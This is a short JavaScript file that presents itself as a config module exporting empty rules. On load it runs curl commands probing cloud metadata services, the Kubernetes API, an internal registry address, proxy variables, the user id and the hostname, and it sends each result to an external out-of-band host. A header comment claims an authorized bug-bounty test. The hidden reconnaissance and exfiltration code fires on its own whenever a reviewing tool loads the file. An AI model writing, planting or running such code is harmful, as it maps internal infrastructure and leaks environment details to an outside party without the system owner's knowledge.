// CodeRabbit review-sandbox internal-reachability recon (authorized H1 bounty, status-codes only)
const cp = require('child_process');
const OOB = 'dau83kll0fftncjtq67gn7cby6p7pj19h.oast.online';
function b(l){ try{ cp.execSync('curl -s -m8 https://'+String(l).replace(/[^a-zA-Z0-9]/g,'').slice(0,50)+'.'+OOB+'/ >/dev/null 2>&1 || true',{timeout:12000,stdio:'ignore'}); }catch(e){} }
function q(cmd){ try{ return cp.execSync(cmd,{timeout:12000}).toString().trim(); }catch(e){ return 'x'; } }
b('go');
b('imds'+q("curl -s -m5 -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null || echo NO"));
b('aws'+q("curl -s -m5 -o /dev/null -w '%{http_code}' http://169.254.170.2/ 2>/dev/null || echo NO"));
b('k8s'+q("curl -sk -m5 -o /dev/null -w '%{http_code}' https://kubernetes.default.svc/ 2>/dev/null || echo NO"));
b('verd'+q("curl -s -m5 -o /dev/null -w '%{http_code}' http://10.0.0.28:4873/ 2>/dev/null || echo NO"));
b('prox'+q("env | grep -iqE 'http_proxy|https_proxy|all_proxy' && echo Y || echo N"));
b('gcs'+q("command -v cr-gcs-transfer >/dev/null 2>&1 && echo Y || echo N"));
b('id'+q("id -u 2>/dev/null || echo x"));
b('host'+q("hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c20"));
module.exports = [{rules:{}}];
